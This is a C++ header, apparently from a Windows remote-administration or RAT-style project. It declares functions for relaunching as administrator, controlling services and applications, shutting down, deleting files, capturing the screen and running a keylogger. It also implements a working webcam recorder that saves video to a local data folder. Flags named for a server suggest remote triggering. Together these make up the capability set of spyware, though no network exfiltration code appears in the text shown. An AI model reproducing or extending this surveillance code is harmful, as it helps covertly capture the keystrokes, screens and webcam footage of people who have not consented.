#pragma once
#ifndef WINDOWAPI_H
#define WINDOWAPI_H
#include "Header.h"

bool IsRunningAsAdmin();
void RelaunchAsAdmin();
vector<std::pair<std::wstring, std::wstring>> ListServices();
bool StartServiceByName(const wstring& serviceName);
bool StopServiceByName(const wstring& serviceName);
std::wstring stringToWString(const std::string& str);
std::string wstringToString(const std::wstring& wstr);
std::string GetShortcutTarget(const std::string& shortcutPath);
std::vector<std::pair<std::string, std::string>> FindShortcutsInDirectory(const std::string& directory);
std::vector<std::pair<std::string, std::string>> ListApplications();
bool StartApp(const std::string& appPath);
bool StopApp(const std::string& appPath);
int ShutdownSystem();
int ResetSystem();
string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed);
void Keylogger(bool& isTurnOn, bool& appOn);
bool DeleteFile(const string& filepath);
bool CaptureScreen();
struct WebcamController {
    IGraphBuilder* pGraph = nullptr;
    IMediaControl* pControl = nullptr;
    IVideoWindow* pVideoWindow = nullptr;
    IBaseFilter* pCaptureFilter = nullptr;

    void releaseResources() {
        if (pControl) {
            pControl->Stop();
            pControl->Release();
            pControl = nullptr;
        }
        if (pVideoWindow) {
            pVideoWindow->put_Visible(OAFALSE);
            pVideoWindow->put_Owner((OAHWND)GetConsoleWindow());
            pVideoWindow->Release();
            pVideoWindow = nullptr;
        }
        if (pCaptureFilter) {
            pCaptureFilter->Release();
            pCaptureFilter = nullptr;
        }
        if (pGraph) {
            pGraph->Release();
            pGraph = nullptr;
        }
        CoUninitialize();
    }

    ~WebcamController() {
        releaseResources();
    }

    bool startWebcam() {
		wstring outputFile = L"_Data/Webcam/webcam";
        if (pControl) {
            cout << "Webcam is already running.\n";
            return false;
        }

        if (FAILED(CoInitialize(nullptr))) {
            cerr << "Failed to initialize COM.\n";
            return false;
        }

        if (FAILED(CoCreateInstance(CLSID_FilterGraph, nullptr, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph))) {
            cerr << "Failed to create GraphBuilder.\n";
            CoUninitialize();
            return false;
        }

        ICreateDevEnum* pDevEnum = nullptr;
        IEnumMoniker* pEnum = nullptr;
        if (FAILED(CoCreateInstance(CLSID_SystemDeviceEnum, nullptr, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum)) ||
            FAILED(pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0)) || !pEnum) {
            cerr << "No webcam found.\n";
            releaseResources();
            return false;
        }

        IMoniker* pMoniker = nullptr;
        if (pEnum->Next(1, &pMoniker, nullptr) == S_OK) {
            pMoniker->BindToObject(nullptr, nullptr, IID_IBaseFilter, (void**)&pCaptureFilter);
            pMoniker->Release();
        }
        pEnum->Release();
        pDevEnum->Release();

        if (!pCaptureFilter) {
            cerr << "Failed to bind webcam.\n";
            releaseResources();
            return false;
        }

        if (FAILED(pGraph->AddFilter(pCaptureFilter, L"Video Capture"))) {
            cerr << "Failed to add webcam filter to graph.\n";
            releaseResources();
            return false;
        }

        ICaptureGraphBuilder2* pCaptureGraphBuilder = nullptr;
        if (FAILED(CoCreateInstance(CLSID_CaptureGraphBuilder2, nullptr, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pCaptureGraphBuilder)) ||
            FAILED(pCaptureGraphBuilder->SetFiltergraph(pGraph))) {
            cerr << "Failed to set capture graph builder.\n";
            pCaptureGraphBuilder->Release();
            releaseResources();
            return false;
        }

        IBaseFilter* pMux = nullptr;
        if (FAILED(CoCreateInstance(CLSID_AviDest, nullptr, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pMux)) ||
            FAILED(pGraph->AddFilter(pMux, L"Avi Mux"))) {
            cerr << "Failed to add AVI Mux filter.\n";
            pCaptureGraphBuilder->Release();
            releaseResources();
            return false;
        }

        IFileSinkFilter* pFileSink = nullptr;
        if (FAILED(pCaptureGraphBuilder->SetOutputFileName(&MEDIASUBTYPE_Avi, outputFile.c_str(), &pMux, &pFileSink))) {
            cerr << "Failed to set output file.\n";
            pCaptureGraphBuilder->Release();
            releaseResources();
            return false;
        }

        if (FAILED(pCaptureGraphBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCaptureFilter, nullptr, pMux))) {
            cerr << "Failed to render capture stream.\n";
            pFileSink->Release();
            pCaptureGraphBuilder->Release();
            releaseResources();
            return false;
        }

        pFileSink->Release();
        pCaptureGraphBuilder->Release();

        if (FAILED(pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl)) ||
            FAILED(pGraph->QueryInterface(IID_IVideoWindow, (void**)&pVideoWindow))) {
            cerr << "Failed to query Media Control or Video Window.\n";
            releaseResources();
            return false;
        }

        pVideoWindow->put_WindowStyle(WS_OVERLAPPEDWINDOW);
        pVideoWindow->SetWindowPosition(100, 100, 640, 480);
        pVideoWindow->put_Visible(OATRUE);

        if (FAILED(pControl->Run())) {
            cerr << "Failed to start the graph.\n";
            releaseResources();
            return false;
        }

        cout << "Webcam started and video is being recorded to " << string(outputFile.begin(), outputFile.end()) << ".\n";
        return true;
    }

    void stopWebcam() {
        if (!pControl) {
            cout << "Webcam is not running.\n";
            return;
        }

        releaseResources();
        cout << "Webcam stopped.\n";
    }
};
void Webcam(bool& isWebcamOn, bool& isServerOn);
#endif // !WINDOWAPI_H
